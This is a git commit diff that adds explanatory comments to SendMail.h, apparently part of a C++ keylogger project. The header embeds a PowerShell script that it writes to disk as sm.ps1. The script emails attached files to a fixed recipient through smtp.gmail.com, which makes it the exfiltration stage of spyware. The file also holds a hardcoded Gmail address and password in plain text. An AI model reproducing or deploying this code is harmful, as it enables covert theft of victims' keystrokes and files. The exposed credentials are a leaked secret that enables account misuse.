cb64ba10d64e216a1df5d6661a7a79f80e9acfa4
Saksham Gupta <gupta.10@iitj.ac.in>
2017-11-22 02:47:31 +0530

    Comments for SendMail

--- SendMail.h
+++ SendMail.h
@@ -7,6 +7,11 @@
 #include "Timer.h"
 #include "Helper.h"
 
+/*
+http://stackoverflow.com/questions/19634220/c-and-powershell
+
+*/
+
 #define SCRIPT_NAME "sm.ps1"
 namespace Mail
 {
@@ -15,36 +20,65 @@ namespace Mail
     #define X_EM_FROM "desmondmile03@gmail.com"
     #define X_EM_PASS "Desmond1"
 
-const std::string &PowerShellScript =
+const std::string &PowerShellScript =                                                  //Just the powershell script converted to C++
+
 "Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
+
 "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
+
 " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+
 "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+
 "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
+
 "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+
 "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+
 "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+
 "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
+
 "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
+
 "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
+
 "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
+
 "  ForEach ($val in $Attachments)\r\n                    "
+
 "        {\r\n               "
+
 "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
+
 "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
+
 "}\r\n                catch\r\n                    {\r\n                        exit 2; "
+
 "#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
+
 "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
+
 "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
+
 "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
+
 "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
+
 "exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
+
 " something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
+
 "Send-EMail -attachment $Att "
+
 "-To \"" +
+
  std::string (X_EM_TO) +
  "\""
+
 " -Body $Body -Subject $Subj "
+
 "-password \"" +
  std::string (X_EM_PASS) +
   "\""
@@ -58,23 +92,23 @@ const std::string &PowerShellScript =
     #undef X_EM_PASS
 
 
-    std::string StringReplace (std::string s, const std::string &what, const std::string &with)
-        {
+    std::string StringReplace (std::string s, const std::string &what, const std::string &with) //first parameter string itself, second parameter what to look for
+        {                                                                                       //third parameter is what we intend to replace it with
             if(what.empty())
                 return s;
-            size_t sp = 0;
-            while((sp = s.find(what, sp)) != std::string::npos)
-                s.replace(sp, what.length(), with), sp += with.length();
+            size_t sp = 0;                              //useful for iterating string one position at a time, sp stands for string position.
+            while((sp = s.find(what, sp)) != std::string::npos)         //while sp finds what are we looking for and where are we looking it, string::npos is string termination
+                s.replace(sp, what.length(), with), sp += with.length(); //with we are replacing with what and we are also increasing the sp count by with length
             return s;
         }
-    bool CheckFileExists (const std::string &f)
+    bool CheckFileExists (const std::string &f)      //Just check if the file exists, if it does it will return true
         {
             std::ifstream file (f);
             return (bool)file;
         }
     bool CreateScript()
         {
-            std::ofstream script (IO::GetOurPath(true) + std::string(SCRIPT_NAME));
+            std::ofstream script (IO::GetOurPath(true) + std::string(SCRIPT_NAME));    //we will get the path name and concatenate it with the script name
             if (!script)
                 return false;
             script << PowerShellScript;
